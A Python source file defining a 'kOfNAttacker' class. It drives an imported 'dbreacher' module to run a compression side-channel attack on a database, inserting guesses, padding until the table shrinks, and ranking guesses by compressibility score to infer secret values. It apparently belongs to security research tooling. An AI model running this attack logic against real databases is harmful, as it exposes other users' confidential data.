import dbreacher

class kOfNAttacker():
    def __init__(self, k, dbreacher : dbreacher.DBREACHer, guesses, tiesOn):
        self.k = k
        self.n = len(guesses)
        self.guesses = guesses
        self.dbreacher = dbreacher
        self.compressibilityScores = dict()
        self.tiesOn = tiesOn

    def setUp(self) -> bool: 
        self.compressibilityScores = dict()
        success = self.dbreacher.reinsertFillers()
        return success

    def tryAllGuesses(self, verbose = False) -> bool:
        for guess in self.guesses:
            shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(guess)
            if shrunk:
                if verbose:
                    print("table shrunk too early on guess " + guess)
                return False
            while not shrunk:
                shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
            score = self.dbreacher.getCompressibilityScoreOfCurrentGuess()
            if verbose:
                print("\"" + guess + "\" score = " + str(score))
            self.compressibilityScores[guess] = score
        return True

    def getTopKGuesses(self):
        scoresList = [(item[1], item[0]) for item in self.compressibilityScores.items()]
        scoresList.sort(reverse=True)
        winners = scoresList[:self.k]
        if self.tiesOn:
            for idx in range(self.k, len(scoresList)):
                if scoresList[idx][0] == winners[self.k - 1][0]:
                    winners.append(scoresList[idx])
                else:
                    break

        return winners

